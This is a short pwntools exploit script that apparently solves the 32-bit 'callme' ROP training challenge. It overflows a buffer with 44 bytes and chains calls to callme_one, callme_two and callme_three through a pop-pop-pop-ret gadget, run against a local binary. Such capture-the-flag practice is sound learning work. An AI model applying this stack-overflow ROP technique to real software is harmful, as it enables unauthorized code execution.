from pwn import *

# 0x080488a9 : pop esi ; pop edi ; pop ebp ; ret

#   4 0x080485b0  GLOBAL    FUNC callme_three
#   5 0x080485c0  GLOBAL    FUNC callme_one
#  12 0x08048620  GLOBAL    FUNC callme_two

junk = "A" * 44

pppr = p32(0x80488a9)

callme_one = p32(0x80485c0)
callme_two = p32(0x8048620)
callme_three = p32(0x80485b0)

params = p32(1) + p32(2) + p32(3)
payload = junk + callme_one + pppr + params
payload += callme_two + pppr + params
payload += callme_three + pppr + params

p = process('./callme32')
#io = gdb.attach(p)
p.recvuntil('> ')
p.sendline(payload)
p.recvall()
#p.interactive()
